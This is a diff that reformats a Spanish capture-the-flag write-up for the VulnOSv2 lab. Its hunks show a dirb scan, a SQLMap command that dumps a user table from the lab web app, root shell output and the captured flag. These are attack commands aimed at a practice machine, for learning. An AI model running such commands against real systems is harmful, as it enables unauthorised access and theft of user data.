@@ -254,6 +254,7 @@ DOWNLOADED: 4612 - FOUND: 3
 ---
 
 >**``dirb http://10.0.0.123/jabcd0cs``**
+
 ---
 
 ```console
@@ -403,6 +404,7 @@ Para realizar el ataque de SLQi se utilza la herramienta **SQLMap**, cabe aclara
 ---
 
 >**``sqlmap -u "http://10.0.0.123/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs -T odm_user --dump``**
+
 ---
 
 ```console
@@ -468,6 +470,7 @@ uid=0(root) gid=0(root) groups=0(root),1001(webmin)
 
 ### **Flag**
 ---
+```console
 root@VulnOSv2:/root# cat flag.txt 
 Hello and welcome.
 You successfully compromised the company "JABC" and the server completely !!
@@ -475,6 +478,8 @@ Congratulations !!!
 Hope you enjoyed it.
 
 What do you think of A.I.?
+```
+
 ---
 
 
